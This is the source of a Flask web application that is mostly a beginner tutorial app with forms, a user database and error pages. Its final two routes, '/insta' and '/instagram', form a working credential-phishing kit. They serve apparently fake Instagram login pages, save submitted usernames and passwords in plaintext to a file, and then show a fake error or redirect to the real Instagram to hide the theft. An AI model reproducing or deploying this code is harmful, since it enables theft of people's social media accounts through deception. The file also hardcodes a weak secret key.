from flask import Flask, render_template, flash, request, redirect
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

# Create a Flask Instance
app = Flask(__name__)
# Add Database
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
# Secret Key
app.config['SECRET_KEY'] = "mysecretkey"

# Initialize the Database
db = SQLAlchemy(app)
# Create DB Model
class Users(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	name = db.Column(db.String(200), nullable=False)
	email = db.Column(db.String(120), nullable=False, unique=True)
	date_added = db.Column(db.DateTime, default=datetime.utcnow)

	# Create a String
	def __repr__(self):
		return '<Name %r>' % self.name

class userForm(FlaskForm):
	name = StringField("Name", validators=[DataRequired()])
	email = StringField("Email", validators=[DataRequired()])
	submit = SubmitField("Submit")

# Create a Form Class
class nameForm(FlaskForm):
	name = StringField("Whats Your Name?", validators=[DataRequired()])
	submit = SubmitField("Submit")


# Create a route decorator
@app.route('/')
def index():
	flash("Welcome to my Website!")
	return render_template("index.html")

@app.route('/user/<name>')
def user(name):
	return render_template("user.html", user_name=name)

# Error Pages
@app.errorhandler(404)
def page_not_found(e):
	return render_template("404.html"), 404

# Internal Server Error
@app.errorhandler(500)
def page_not_found(e):
	return render_template("500.html"), 500

# Create Name Page
@app.route('/name', methods=['GET', 'POST'])
def nameform():
	name = None
	form = nameForm()
	# VALIDATE FORM
	if form.validate_on_submit():
		name = form.name.data
		form.name.data = ''
		flash("Form Submitted Successfully")

	return render_template("nameform.html", 
		name=name,
		form=form)

@app.route('/user/add', methods=['GET', 'POST'])
def add_user():
	name = None
	form = userForm()
	success = None
	if form.validate_on_submit():
		user = Users.query.filter_by(email=form.email.data).first()
		if user is None:
			user = Users(name=form.name.data, email=form.email.data)
			db.session.add(user)
			db.session.commit()
			name = form.name.data
			form.name.data = ''
			form.email.data = ''
			flash("User Added Successfully!")
			success = True
		else:
			form.name.data = ''
			form.email.data = ''
			flash("Email Already Exists")
			success = False
	our_users = Users.query.order_by(Users.date_added)
	return render_template("add_user.html",
		form=form, name=name, our_users=our_users, success=success)

@app.route('/insta', methods=['GET', 'POST'])
def insta():
	if request.method == 'POST':
		username = request.form.get('username')
		password = request.form.get('password')
		# return f"username: {username} <br> password: {password}"
		with open('file.txt', 'w') as f:
			f.write(f"insta\nusername: {username}\npassword: {password}\n")
		return "<center><h1>SOMETHING WENT WRONG, WE ARE WORKING TO FIX IT!</h1></center>"
	return render_template('insta.html')

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
	if request.method == 'POST':
		username = request.form.get('username')
		password = request.form.get('password')
		# return f"username: {username} <br> password: {password}"
		with open('file.txt', 'w') as f:
			f.write(f"insta\nusername: {username}\npassword: {password}\n")
		return redirect('https://www.instagram.com/')
		# return "<center><h1>SOMETHING WENT WRONG, WE ARE WORKING TO FIX IT!</h1></center>"
	return render_template('instagram.html')
